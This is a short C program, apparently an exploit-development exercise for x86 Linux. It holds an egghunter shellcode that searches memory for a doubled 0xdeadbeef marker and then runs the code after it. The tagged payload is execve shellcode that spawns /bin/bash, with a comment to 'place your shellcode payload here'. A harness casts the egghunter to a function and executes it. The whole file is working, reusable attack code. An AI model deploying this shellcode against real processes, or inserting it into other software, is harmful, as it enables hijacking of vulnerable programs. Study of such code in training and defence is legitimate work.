#include<stdio.h>
#include<string.h>

unsigned char egghunter[] = \
"\xeb\x17\x58\xbb\xef\xbe\xad\xde\x40\x39\x18\x75\xfb\x83\xc0\x04\x39\x18\x75\xf4\x83\xc0\x04\xff\xe0\xe8\xe4\xff\xff\xff";

unsigned char egg[] = \
"\xef\xbe\xad\xde" /* first egg */
"\xef\xbe\xad\xde" /* second egg */
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; /* place your shellcode payload here */

main()
{

        printf("Shellcode Length:  %d\n", strlen(egghunter));

        int (*ret)() = (int(*)())egghunter;

        ret();

}
